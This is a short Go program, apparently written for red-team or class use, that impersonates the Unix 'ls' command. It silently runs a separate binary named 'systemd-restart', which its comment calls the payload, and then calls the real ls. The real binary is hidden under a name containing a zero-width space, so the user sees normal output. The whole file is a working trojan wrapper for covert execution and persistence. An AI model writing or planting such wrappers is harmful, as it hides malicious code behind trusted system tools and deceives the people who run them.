//Michael Burke, mdb5315@rit.edu
package main

import (
	"os"
	"os/exec"
)

func main() {
	//Execute the payload
	rev := exec.Command("systemd-restart")
	rev.Run()
	//Execute the genuine ls binary and return the results
	cmd := exec.Command("ls​" /*THERE IS A ZERO WIDTH SPACE IN HERE*/, os.Args[1:]...)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Run()
}
